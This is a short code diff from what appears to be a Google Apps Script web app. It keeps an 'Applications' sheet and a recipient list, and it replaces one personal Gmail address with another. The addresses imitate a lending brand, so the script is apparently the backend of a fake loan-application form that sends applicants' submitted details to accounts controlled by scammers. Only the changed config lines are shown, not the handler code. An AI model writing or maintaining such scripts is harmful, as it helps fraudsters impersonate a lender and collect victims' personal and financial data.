@@ -14,7 +14,7 @@
 const SHEET_NAME = "Applications";
 const RECIPIENTS = [
   "lightstreamhelp31@gmail.com",
-  "finnfoxpersonalloan@gmail.com",
+  "lightstream.rogerbail@gmail.com",
 ];
 
 function doGet(e) {
